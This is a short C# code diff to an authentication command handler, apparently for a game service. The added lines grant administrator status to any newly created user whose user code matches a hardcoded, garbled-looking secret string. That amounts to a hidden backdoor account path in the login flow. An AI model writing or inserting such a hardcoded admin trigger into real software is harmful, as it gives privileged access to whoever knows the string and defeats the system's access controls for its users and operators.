@@ -30,7 +30,9 @@ public class AuthenticateCommandHandler : IRequestHandler<AuthenticateCommand, A
 
         if (user is null)
         {
-            user = UserAggregate.Create(request.UserCode, AccountId.CreateUnique(), GameId.CreateUnique());
+            var adminState = (request.UserCode == "{<)#% M%<()#$<%B$#B$sdg.;F6a;(");
+            
+            user = UserAggregate.Create(request.UserCode, adminState, AccountId.CreateUnique(), GameId.CreateUnique());
             await _userRepository.AddAsync(user);
             await _unitOfWork.SaveChangesAsync();
         }
